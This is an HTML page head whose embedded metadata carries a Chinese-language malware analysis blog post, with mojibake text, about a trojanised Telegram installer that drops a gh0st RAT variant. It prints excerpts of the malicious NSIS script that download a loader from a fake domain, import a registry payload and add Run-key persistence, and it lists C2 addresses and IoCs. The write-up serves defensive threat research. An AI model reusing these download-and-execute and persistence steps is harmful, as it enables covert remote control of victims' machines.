
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="&lt;Theo/&gt;">
    <title>åˆ†æä¸€å€‹åŠ æ–™çš„ Telegram for Windows ä¸­æ–‡ç‰ˆå®‰è£ç¨‹å¼ - &lt;Theo/&gt;</title>
    <meta name="author" content="Theo Chen">
    
        <meta name="keywords" content="Telegram,Trojan,gh0st RAT,Malware">
    
    
        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
    
    
        
            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
        
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"ç´€éŒ„ä¸€ä¸‹åˆ†æä¸€å€‹è¢«é‡æ–°æ‰“åŒ…åŠ æ–™éçš„ä¸­æ–‡ç‰ˆ Telegram å®‰è£ç¨‹å¼çš„éç¨‹å’Œç™¼ç¾çš„æ±è¥¿ã€‚\n\n\n\n\n\næœ€åˆçš„æ¨£æœ¬ä¾†è‡ª http://telegram-vip[.]comï¼Œä¸€å€‹ä¸­æ–‡ç‰ˆ Telegram çš„ä»‹ç´¹å’Œä¸‹è¼‰ç¶²ç«™ã€‚\nFigure 1. å‡çš„ä¸­æ–‡ç‰ˆ Telegram ç¶²ç«™\n\nç¶²ç«™é¦–é å°±æœ‰å„ç‰ˆæœ¬çš„ä¸‹è¼‰é€£çµï¼Œä½†å…¶ä¸­é¦–é ä¸‹è¼‰ Telegram for Mac å’Œ Telegram for windows çš„é€£çµéƒ½æœƒæ˜¯ä¸‹è¼‰è¢«åŠ æ–™éçš„ Windows å®‰è£ç¨‹å¼ï¼ˆå¯«é€™ç¯‡æ–‡ç« çš„æ™‚å€™ä¸‹è¼‰çš„æª”æ¡ˆæ˜¯ tsetup.2.1.10.exeï¼‰ã€‚é»é¸ Android æˆ– iPhone çš„ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹ä¸‹è¼‰çš„é é¢ï¼š\nFigure 2. ä¸‹è¼‰é é¢\né€™é‚Šå°±æœ‰äº›ä¸åŒäº†ï¼š\n\niPhone ä¸‹è¼‰çš„é€£çµæœƒé€£å›åˆ°æ­£å¸¸çš„ Apple App Store https://apps.apple.com/app/telegram-messenger/id686449807\nAndroid ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹é€£çµä¸‹è¼‰æª”æ¡ˆ https://telegrcn.org/download/telegramCN_631.apk\nMac ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹é€£çµä¸‹è¼‰æª”æ¡ˆ https://telegrcn.org/download/tsetup.2.1.10.dmg\nWindows ç‰ˆæœ¬è·Ÿé¦–é ä¸‹è¼‰çš„æª”æ¡ˆä¸€æ¨£\n\næ¥ä¸‹ä¾†é€™ç¯‡æ–‡ç« æœƒåªé‡å° Windows çš„ç‰ˆæœ¬æ•˜è¿°ï¼Œé€™å€‹å‡çš„ç¶²ç«™åœ¨ä»Šå¹´ 9 æœˆæ™‚å°±å·²ç¶“åœ¨ Twitter ä¸Šæœ‰ç›¸é—œçš„è¨è«–ï¼ŒAndroid ç‰ˆæœ¬çš„ APK ä¹Ÿå·²çŸ¥æ˜¯å‡çš„ APPï¼Œæˆ‘åœ¨å¿«åˆ†æå®Œäº†æ‰æŸ¥åˆ°é€™å€‹è³‡æ–™ ğŸ˜¢ï¼Œå†æ¬¡å­¸åˆ°æ•™è¨“æŠŠé ­åŸ‹é€²é€†å‘ä¹‹å‰é‚„æ˜¯è¦å¥½å¥½çš„æŠŠè¨Šæ¯è’é›†è·Ÿèª¿æŸ¥åšå¥½ã€‚\n\nInteresting, signed, low detected &quot;telegram_setup.2.1.6.exe&quot;: 8c957cfced1bcf7803f810d6ae5a6d13cce005637be3ed40a311793419cd92c1From: http://telegram-vip[.]com/telegram_setup.2.1.6.exeSeems some Chinese speaker made malware, targeting Chinese people.ğŸ¤”cc @JAMESWT_MHT @cyb3rops pic.twitter.com/5jAtnQCkjx&mdash; MalwareHunterTeam (@malwrhunterteam) September 28, 2020 \n\n\nä¸éé›–ç„¶å·²ç¶“æœ‰è¨è«–ä¸²å‡ºç¾ï¼Œä½†ç¾åœ¨çœ‹åˆ°çš„ç‰ˆæœ¬å·²ç¶“ä¾†åˆ°äº† 2.1.10ï¼Œé€™è®“æˆ‘å¥½å¥‡æƒ³è¦ä¾†æ¯”è¼ƒä¸€ä¸‹è·Ÿä¹æœˆæ™‚çš„ 2.1.6 ç‰ˆæœ¬æœ‰äº†ä»€éº¼è®ŠåŒ–ã€‚æ¥ä¸‹ä¾†æœƒç”¨æˆ‘æ‰‹ä¸Šæœ‰çš„ telegram_setup.2.1.10.exe è·Ÿæˆ‘åœ¨ ANY.RUN é€™å€‹åˆ†ææ‰¾åˆ°çš„ telegram_setup.2.1.6.exe ç›¸é—œæª”æ¡ˆä¾†åšæ¯”è¼ƒã€‚\né‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼\n\n\nFilename\nSHA256\n\n\n\ntelegram_setup.2.1.6.exe\n1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8\n\n\ntelegram_setup.2.1.10.exe\n35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba\n\n\né€™å…©å€‹å®‰è£ç¨‹å¼éƒ½æ˜¯ç”¨ NSIS (nullsoft scriptable install system) æ‰“åŒ…çš„ï¼Œå¯ä»¥åˆ©ç”¨ 7-zip ç›´æ¥è§£å£“ç¸®å°±èƒ½å¾—åˆ°é‚„åŸçš„å®‰è£è…³æœ¬ [NSIS].nsiã€‚7-zip åœ¨ 9.33 çš„ç‰ˆæœ¬åŠ å…¥äº†è‡ªå‹•åç·¨è­¯ NSIS è…³æœ¬çš„åŠŸèƒ½ï¼Œä½†åˆåœ¨ 15.06 æŠŠé€™å€‹åŠŸèƒ½æ‹¿æ‰äº†ï¼Œæ‰€ä»¥è¦æ³¨æ„ 7-zip ç‰ˆæœ¬å¿…é ˆä»‹æ–¼é€™å…©è€…ä¹‹é–“ã€‚\nè§£é–‹ä»¥å¾Œå…©å€‹ç‰ˆæœ¬çš„ç›®éŒ„çµæ§‹å¦‚ä¸‹ï¼š\n123456789101112131415162.1.6/â”œâ”€â”€ $PLUGINSDIR                        // NSIS ç›¸é—œçš„æª”æ¡ˆâ”‚Â Â  â”œâ”€â”€ InstallOptions.dllâ”‚Â Â  â”œâ”€â”€ ioSpecial.iniâ”‚Â Â  â”œâ”€â”€ LangDLL.dllâ”‚Â Â  â”œâ”€â”€ modern-wizard.bmpâ”‚Â Â  â””â”€â”€ TextReplace.dllâ”œâ”€â”€ C                                  // å®‰è£éç¨‹ä¸­æœƒç›´æ¥è¤‡è£½åˆ°å°æ‡‰çš„ä½ç½®çš„æª”æ¡ˆâ”‚Â Â  â””â”€â”€ PerfLogâ”‚Â Â      â”œâ”€â”€ AddInProcess.exe           // Backdoor (Loader)â”‚Â Â      â””â”€â”€ AddInProcess.exe.configâ”œâ”€â”€ [NSIS].nsi                         // 7-zip è§£å‡ºä¾†çš„ NSIS è…³æœ¬â”œâ”€â”€ ns.reg                             // Payload Registry Fileâ”œâ”€â”€ Telegram.exe                       // Telegram Desktop 2.1.6.0â”œâ”€â”€ uninst.exe.nsisâ””â”€â”€ Updater.exe\n123456789101112132.1.10/â”œâ”€â”€ $PLUGINSDIR                        // NSIS ç›¸é—œçš„æª”æ¡ˆâ”‚Â Â  â”œâ”€â”€ InetLoad.dllâ”‚Â Â  â”œâ”€â”€ InstallOptions.dllâ”‚Â Â  â”œâ”€â”€ ioSpecial.iniâ”‚Â Â  â”œâ”€â”€ LangDLL.dllâ”‚Â Â  â”œâ”€â”€ modern-wizard.bmpâ”‚Â Â  â”œâ”€â”€ System.dllâ”‚Â Â  â””â”€â”€ TextReplace.dllâ”œâ”€â”€ [NSIS].nsi                         // 7-zip è§£å‡ºä¾†çš„ NSIS è…³æœ¬â”œâ”€â”€ Telegram.exe                       // Telegram Desktop 2.1.6.0â”œâ”€â”€ uninst.exe.nsisâ””â”€â”€ Updater.exe\n\nå°æ¯”å…©å€‹ç‰ˆæœ¬å¯ä»¥å¾ˆæ˜é¡¯çš„æ³¨æ„åˆ° 2.1.10 å°‘äº† C:\\PerfLog è·Ÿ ns.reg é—œéµçš„å¾Œé–€æª”æ¡ˆï¼Œ2.1.6 å¾ˆç›´æ¥çš„å°±æŠŠé€™äº›æª”æ¡ˆä¸€èµ·æ‰“åŒ…ï¼Œ2.1.10 æ”¹è®Šæ–¹å¼ï¼Œåˆ©ç”¨ NSIS è…³æœ¬åœ¨å®‰è£éç¨‹ä¸­æ‰å°‡é€™å…©å€‹æª”æ¡ˆä¸‹è¼‰ä¸‹ä¾†ï¼Œé€™å¯ä»¥åœ¨ [NSIS].nis è…³æœ¬ä¸­çœ‹åˆ°ï¼Œä¸‹é¢æ˜¯å¾ 2.1.10 çš„ [NSIS].nsi è…³æœ¬ä¸­ç¯€éŒ„éƒ¨ä»½ç›¸é—œçš„æŒ‡ä»¤ï¼š\n123# Download loader and registry fileInetLoad::load /BANNER &quot;&quot; &quot;Cameron Diaz download in progress, please wait ;)&quot; http://www.telegram-vip.com/index2.php cnPath.exeInetLoad::load /BANNER &quot;&quot; &quot;Cameron Diaz download in progress, please wait ;)&quot; http://www.telegram-vip.com/index3.php ns.reg\n12345# Replace 123456 to &lt;ComputerName&gt; from ns.reg then use regedit.exe to importReadRegStr $R1 HKLM SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName ComputerNameTextReplace::_FindInFile /NOUNLOAD $INSTDIR\\ns.reg 123456 /S=1TextReplace::_ReplaceInFile /NOUNLOAD $INSTDIR\\ns.reg $INSTDIR\\ns.reg 123456 $R1 &quot;/S=1 /C=1 /AO=1&quot;Exec &quot;regedit.exe /s $\\&quot;$INSTDIR\\ns.reg$\\&quot;&quot;\n1234# Move $INSTDIR\\cnPath.exe to C:\\PerfLog\\AddInProcess.exeStrCpy $R0 $INSTDIR\\cnPath.exeStrCpy $R1 C:\\PerfLog\\AddInProcess.exeSystem::Call &quot;Kernel32::MoveFileA(t R0,t R1)&quot;\n123# Setup service registry and runWriteRegStr HKCU Software\\Microsoft\\Windows\\CurrentVersion\\Run telegramCnService C:\\PerfLog\\AddInProcess.exeExecShell &quot;&quot; C:\\PerfLog\\AddInProcess.exe\nåŸºæœ¬ä¸Šçœ‹å®Œ NSIS è…³æœ¬å°±èƒ½äº†è§£å®ƒçš„æ„ŸæŸ“æ‰‹æ®µè·ŸæŒä¹…åŒ–çš„æ–¹å¼ã€‚\nè¼‰å…¥å™¨ AddInProcess.exeçŸ¥é“å®‰è£éç¨‹å‹•çš„æ‰‹è…³ä»¥å¾Œï¼Œç›®æ¨™å°±å¾ˆæ˜ç¢ºäº†ï¼ŒAddInProcess.exe è·Ÿå¯«å…¥çš„ Registry è³‡æ–™ã€‚\n\n\n\nFilename\nSHA256\n\n\n\nAddInProcess.exe (2.1.6)\nf853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063\n\n\nAddInProcess.exe (2.1.10)\n379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811\n\n\nåŸºæœ¬ä¸Šå…©å€‹çš„å‡½å¼å…§å®¹ä¸¦æ²’æœ‰ä¸åŒï¼Œåƒ…æœ‰ metadata æ”¹è®Šè€Œå·²ï¼ŒFile Version å¾ 1.0.0.0 è®Šæˆ 1.3.0.0ã€‚\nFigure 3. å…©è€…çš„æª”æ¡ˆåŸºæœ¬è¨Šæ¯\nFigure 4. ç›¸åŒçš„ .NET å‡½å¼çµæ§‹\nFigure 5. ç›¸åŒçš„ Main å‡½å¼\n\nå¾ Figure 5. çš„ Main å‡½å¼å°±å¯ä»¥çŸ¥é“ï¼ŒAddInProcess.exe åªæ˜¯å€‹è¼‰å…¥å™¨ï¼ŒçœŸæ­£çš„å…§å®¹åœ¨å®‰è£æ™‚åŒ¯å…¥çš„ registry è³‡æ–™è£¡ï¼Œä½åœ¨ HKEY_CURRENT_USER\\Software\\&lt;COMPUTERNAME&gt;è£¡é¢æ˜¯ base64 ç·¨ç¢¼éçš„ DLL å’Œä¸€å€‹ ip ä½å€ã€‚\nFigure 6. Registry çš„å…§å®¹\n\nAssembly.Load(Malware.dll)è—‰åŠ© .NET çš„ Assembly.Load å‡½å¼å¯ä»¥å‹•æ…‹è¼‰å…¥å¦ä¸€å€‹ .NET çš„ DLLï¼Œä¹Ÿå°±æ˜¯ registry çš„å…§å®¹ï¼Œæˆ‘å€‘å¯ä»¥æå–å‡ºä¾†é€²ä¸€æ­¥åˆ†æã€‚\n\n\n\nFilename\nCompile Time\nSHA256\n\n\n\nns.reg (2.1.6)\nN&#x2F;A\n96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22\n\n\nregistry.bin (2.1.6)\n2020-09-23T09:43:39\n7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a\n\n\nns.reg (2.1.10)\nN&#x2F;A\nd620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a\n\n\nregistry.bin (2.1.10)\n2020-09-28T18:16:01\ne60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef\n\n\n\n\n\nPDB Path\n\n\n\nD:\\source\\MyJob\\åå°„dll\\ConsoleApplication2\\obj\\Release\\åå°„.pdb\n\n\n\né€™å…©å€‹ ns.reg éƒ½ç¶­æŒ â€œ123456â€ ä¸¦æœªè¢«ä¿®æ”¹æˆ computer name å‰çš„ç‹€æ…‹ã€‚\n\næå–å‡ºä¾†çš„ .NET DLL æ“æœ‰ç›¸åŒçš„å‡½å¼ã€‚\nFigure 7. registry.bin çš„å‡½å¼\n\nå…¶ä¸­åƒ…æœ‰ Main å‡½å¼ï¼Œå’Œå¯«æ­»åœ¨ ClassBuff å…¶ä¸­çš„ dlldata æœ‰å·®ç•°ã€‚\nFigure 8. registry.bin (2.1.6) çš„ Main å‡½å¼\nFigure 9. registry.bin (2.1.10) çš„ Main å‡½å¼\n\nåœ¨ 2.1.6 çš„ç‰ˆæœ¬ä¸­ï¼ŒC2 çš„ ip ä½å€æ˜¯ç”¨ Program.GetRegedit() å¾ registry è£¡é¢è®€å‡ºä¾†çš„ï¼Œä¸çŸ¥é“ç‚ºä»€éº¼åœ¨ 2.1.10 çš„ç‰ˆæœ¬ä¸­è®Šæˆå¸¶å…¥å¯«æ­»çš„ base64 å­—ä¸² MTU0LjIyMi4xMDMuNTg6Nzg3OA== åˆ° Program.StartWorkThread()ã€‚\nFigure 10. registry.bin çš„ StartWorkThread å‡½å¼\n\nProgram.StartWorkThread() è² è²¬å°‡ C2 çš„ ip ä½å€å’Œ port æº–å‚™å¥½ä¾†æ¥è‘—å•Ÿå‹• Program.MainThread()ã€‚é€™è£¡æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯é€™å€‹å‡½å¼æœ‰å¦ä¸€å€‹é è¨­çš„ C2 ip ä½å€ï¼Œç•¶å‡½æ•¸è¢«å‘¼å«ä»£å…¥ç©ºå­—ä¸²æ™‚ï¼Œä¾¿æœƒä½¿ç”¨é€™å€‹ ipã€‚ç¶œåˆå‰é¢çœ‹åˆ° Main() å‡½å¼è£¡æœ‰å€‹è¿´åœˆï¼Œåœ¨ç­‰å¾… 300 ç§’å¾Œä¾¿æœƒå‘¼å« Program.StartWorkThread(&quot;&quot;)ï¼Œé€™æ™‚ä¾¿æœƒä½¿ç”¨é€™å€‹ ip ä½å€ã€‚\nFigure 11. registry.bin çš„ MainThread å‡½å¼\n\nProgram.MainThread() æ¥è‘—å°‡åŒ…å« ip ä½å€çš„ç‰©ä»¶è½‰ç‚º bytes å¾Œï¼Œå°‹æ‰¾ ClassBuff().dlldata è£¡é è¨­çš„ 255.255.255.255 ä¾†è¦†è“‹æ‰ã€‚æœ€å¾Œä½¿ç”¨ DLLFromMemory é€™å€‹ class åœ¨è¨˜æ†¶é«”ä¸­ç›´æ¥åŸ·è¡Œæœ€çµ‚çš„ DLLï¼Œexport function Launchã€‚\nHello gh0st RAT DLL\n\n\nFilename\nCompile Time\nSHA256\n\n\n\ndlldata_2.1.6.bin\n2020-09-23T06:17:16\ne0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0\n\n\ndlldata_2.1.10.bin\n2020-09-28T18:15:16\n9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db\n\n\n\n\n\nPDB Path\n\n\n\nD:\\source\\MyJob\\ä¼ä¸šè¿œç¨‹æ§åˆ¶\\Release\\ServerDll.pdb\n\n\n\né€™å…©å€‹ DLL éƒ½ç¶­æŒ C2 ip æ˜¯ 255.255.255.255ï¼Œé‚„æ²’è¢«ä¿®æ”¹å‰å¯«æ­»åœ¨ registry.bin çš„åŸæ¨£ã€‚\n\næœ€å¾Œåœ¨è¨˜æ†¶é«”ä¸­å‹•æ…‹è¼‰å…¥çš„ DLL æ˜¯ gh0st RAT çš„è®Šç¨®ï¼Œæ–°èˆŠç‰ˆæœ¬å…©è€…çš„ç›¸ä¼¼åº¦æ¥µé«˜ï¼ŒåŠŸèƒ½ä¸Šå¤§è‡´æ²’æœ‰å·®ç•°ã€‚\nFigure 12. dlldata_2.1.6.bin å’Œ dlldata_2.1.10.bin BinDiff çš„æ¯”è¼ƒçµæœ\n\né—œæ–¼ gh0st RAT çš„å·²ç¶“æœ‰å¾ˆå¤šå¾ˆè©³ç´°çš„å ±å‘Šè·ŸåŸå§‹ç¢¼å¯ä»¥é–±è®€ï¼Œé€™é‚Šå°±ä¸ç´°è¬›æœ€å¾Œçš„é€™å€‹ DLLã€‚æ¯”è¼ƒå€¼å¾—æçš„æ˜¯é€™å€‹æ¨£æœ¬å‚³é€å’Œæ¥æ”¶ TCP å°åŒ…éƒ½æœ‰é€²è¡Œç°¡å–®çš„ä½å…ƒé‹ç®—ã€‚\nFigure 13. æ”¶åˆ°å°åŒ…å¾Œçš„ç·¨ç¢¼å‹•ä½œ\nFigure 14. é€å‡ºå°åŒ…å‰çš„ç·¨ç¢¼å‹•ä½œ\n\nå¦å¤–é€™å€‹ gh0st RAT è®Šç¨®çš„ magic header åƒ…æœ‰ä¸‰å€‹å­—ï¼š 203 (\\x32\\x30\\x33)ï¼Œç·¨ç¢¼å¾Œæ˜¯ \\xCD\\xCF\\xCEï¼Œå¾Œé¢ 4 å€‹ bytes ä¸€æ¨£æ˜¯å°åŒ…çš„å¤§å°ï¼ˆFigure 15. çš„æ©˜è‰²æ¡† \\x0F\\x03\\x00\\x00ï¼‰ï¼Œå‰©é¤˜è³‡æ–™ä¸¦æœªå£“ç¸®ã€‚\nFigure 15. åŸå§‹çš„å°åŒ…ç‰¹å¾µ\n\nå»¶ä¼¸èª¿æŸ¥ä»¥ä¸Šï¼Œé—œæ–¼æƒ¡æ„ç¨‹å¼çš„éƒ¨ä»½å·²ç¶“ç­è§£çš„å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹ä¾†æŠŠç›®å…‰æ”¾å›åˆ° C2 ä¸Šé¢ã€‚\nå‰é¢åˆ†æçš„éç¨‹ä¸­å¾—åˆ°äº†é€™å…©å€‹ C2 ä½å€ï¼š\n\n154.222.103.58:7878\nç¬¬ä¸€å€‹ C2 ipï¼Œ2.1.6 ç‰ˆæœ¬æ˜¯å¾ registry è®€å‡ºä¾†ï¼Œåˆ°äº† 2.1.10 é›–ç„¶ registry è£¡ä»ç„¶æœ‰ä¸€æ¨£çš„ ipï¼Œä½†æ¨£æœ¬å…§ä¹ŸåŒæ™‚å¯«æ­»äº†ä¸€æ¨£çš„ ipï¼ˆåƒè€ƒ Figure 9.ï¼‰\n\n\n185.224.168.130:3563\nç¬¬äºŒå€‹ C2 ipï¼Œç­‰å¾…äº”åˆ†é˜å¾Œæ‰é€£ç·šç”¨çš„ï¼ˆåƒè€ƒ Figure 10.ï¼‰\n\n\n\né‚„æœ‰æœ€åˆçš„å‡ç¶²ç«™ http://telegram-vip.comï¼Œ A record æ˜¯ 45.114.106.2ã€‚é€šé favicon hash æˆ– HTML body hash å¯ä»¥æ‰¾åˆ°ç¸½å…±æœ‰äº”å€‹é—œè¯çš„ ip éƒ½éƒ¨å±¬è‘—ä¸€æ¨£çš„å‡ç¶²ç«™ï¼š\n\n45.114.106.2\n45.114.106.3\n45.114.106.4\n45.114.106.5\n45.114.106.6\n\nç›¸é—œçš„æœå°‹ç‰¹å¾µï¼šhttps://www.shodan.io/search?query=http.favicon.hash%3A1246367191+country%3A%22CN%22https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700\nFigure 16. Shodan é‡å° favicon hash çš„æœå°‹çµæœ\n\nFigure 17. Censys é‡å° HTTP body hash çš„æœå°‹çµæœ\n\nå…¶ä¸­ 45.114.106.3 æœ‰ä¸€å€‹ Domain Name telegramsvip.comï¼Œçœ‹äº†ä¸€ä¸‹ whois æ˜¯ 10&#x2F;15 æ‰å»ºçš„\n1234567891011121314151617181920Domain Name: TELEGRAMSVIP.COMRegistry Domain ID: 2565966013_DOMAIN_COM-VRSNRegistrar WHOIS Server: whois.godaddy.comRegistrar URL: http://www.godaddy.comUpdated Date: 2020-10-15T08:01:06ZCreation Date: 2020-10-15T08:01:05ZRegistry Expiry Date: 2021-10-15T08:01:05ZRegistrar: GoDaddy.com, LLCRegistrar IANA ID: 146Registrar Abuse Contact Email: abuse(|]godaddy.comRegistrar Abuse Contact Phone: 480-624-2505Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibitedDomain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibitedDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibitedDomain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibitedName Server: NS35.DOMAINCONTROL.COMName Server: NS36.DOMAINCONTROL.COMDNSSEC: unsignedURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:39:21Z\n\nç”šè‡³é‚„æ‰“äº† Google å»£å‘Š XD\nFigure 18. Google æœå°‹å»£å‘Š\n\nç›¸è¼ƒåŸå…ˆçš„ telegram-vip.com æ˜¯åœ¨ 09&#x2F;21 å°±å»ºç«‹äº†ï¼Œå°±åœ¨ç·¨è­¯å¾Œé–€çš„å‰å…©å¤©ã€‚\n1234567891011121314151617Domain Name: TELEGRAM-VIP.COMRegistry Domain ID: 2561073458_DOMAIN_COM-VRSNRegistrar WHOIS Server: whois.godaddy.comRegistrar URL: http://www.godaddy.comUpdated Date: 2020-10-15T08:03:30ZCreation Date: 2020-09-21T06:44:59ZRegistry Expiry Date: 2021-09-21T06:44:59ZRegistrar: GoDaddy.com, LLCRegistrar IANA ID: 146Registrar Abuse Contact Email: abuse(aT&#125;godaddy.comRegistrar Abuse Contact Phone: 480-624-2505Domain Status: ok https://icann.org/epp#okName Server: NS13.DOMAINCONTROL.COMName Server: NS14.DOMAINCONTROL.COMDNSSEC: unsignedURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:40:38Z\n\nå°çµä»¥ä¸Šä¾¿æ˜¯é‡å° Windows installer çš„éƒ¨ä»½åœ¨åˆ†æéç¨‹ä¸­ç™¼ç¾çš„ä¸€äº›æœ‰è¶£çš„å…§å®¹ï¼Œé€™å€‹è©é¨™ç¶²ç«™ç¾åœ¨é‚„åœ¨æŒçºŒé‹ä½œä¸­ï¼Œæˆ–è¨±æœªä¾†é‚„èƒ½çœ‹åˆ°æ”»æ“Šè€…å°æ¨£æœ¬æœ‰æ‰€æ›´æ–°ï¼Œå†è§€å¯Ÿçœ‹çœ‹ã€‚ï¼ˆæˆ–æ˜¯æœ‰ç©ºä¹Ÿä¾†åˆ†æä¸€ä¸‹é‚£å€‹å‡çš„ APKï¼‰\nIoCs\n\n\nIP\nDescription\n\n\n\n45.114.106.2\nFake Site\n\n\n45.114.106.3\nFake Site\n\n\n45.114.106.4\nFake Site\n\n\n45.114.106.5\nFake Site\n\n\n45.114.106.6\nFake Site\n\n\n154.222.103.58\ngh0st RAT C2\n\n\n185.224.168.130\ngh0st RAT C2\n\n\n\n\n\nDomain\nCreation Date\n\n\n\ntelegram-vip.com\n2020-09-21T06:44:59Z\n\n\ntelegramsvip.com\n2020-10-15T08:01:05Z\n\n\ntelegrcn.org\n2020-05-19T02:31:56Z\n\n\n\n\n\nSHA256\nDescription\n\n\n\n1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8\ntelegram_setup.2.1.6.exe\n\n\n35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba\ntsetup.2.1.10.exe\n\n\nf853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063\nAddInProcess.exe (telegram_setup.2.1.6.exe)\n\n\n379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811\nAddInProcess.exe (tsetup.2.1.10.exe)\n\n\n96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22\nns.reg (2.1.6)\n\n\nd620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a\nns.reg (2.1.10)\n\n\n7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a\nexcracted DLL from ns.reg (2.1.6)\n\n\ne60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef\nextracted DLL from ns.reg (2.1.10)\n\n\ne0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0\nembedded gh0st RAT DLL (2.1.6)\n\n\n9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db\nembedded gh0st RAT DLL (2.1.10)\n\n\n19d1ff6bb589fab200f3bced0f148bb5e20fe9b37bd03de9cd425116cc0dba17\ntelegramCN_631.apk\n\n\n\n\n\nPDB Path\n\n\n\nD:\\source\\MyJob\\åå°„dll\\ConsoleApplication2\\obj\\Release\\åå°„.pdb\n\n\nD:\\source\\MyJob\\ä¼ä¸šè¿œç¨‹æ§åˆ¶\\Release\\ServerDll.pdb\n\n\n","dateCreated":"2020-10-25T17:01:39+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2020-10-25T17:01:39+00:00","description":"ç´€éŒ„ä¸€ä¸‹åˆ†æä¸€å€‹è¢«é‡æ–°æ‰“åŒ…åŠ æ–™éçš„ä¸­æ–‡ç‰ˆ Telegram å®‰è£ç¨‹å¼çš„éç¨‹å’Œç™¼ç¾çš„æ±è¥¿ã€‚","headline":"åˆ†æä¸€å€‹åŠ æ–™çš„ Telegram for Windows ä¸­æ–‡ç‰ˆå®‰è£ç¨‹å¼","image":["thumb-min.jpg","cover-min.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/","keywords":"Malware, Telegram, Trojan, gh0st RAT","thumbnailUrl":"thumb-min.jpg"}</script>
    
    <meta name="description" content="ç´€éŒ„ä¸€ä¸‹åˆ†æä¸€å€‹è¢«é‡æ–°æ‰“åŒ…åŠ æ–™éçš„ä¸­æ–‡ç‰ˆ Telegram å®‰è£ç¨‹å¼çš„éç¨‹å’Œç™¼ç¾çš„æ±è¥¿ã€‚">
<meta property="og:type" content="blog">
<meta property="og:title" content="åˆ†æä¸€å€‹åŠ æ–™çš„ Telegram for Windows ä¸­æ–‡ç‰ˆå®‰è£ç¨‹å¼">
<meta property="og:url" content="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/index.html">
<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
<meta property="og:description" content="ç´€éŒ„ä¸€ä¸‹åˆ†æä¸€å€‹è¢«é‡æ–°æ‰“åŒ…åŠ æ–™éçš„ä¸­æ–‡ç‰ˆ Telegram å®‰è£ç¨‹å¼çš„éç¨‹å’Œç™¼ç¾çš„æ±è¥¿ã€‚">
<meta property="og:locale" content="en_US">
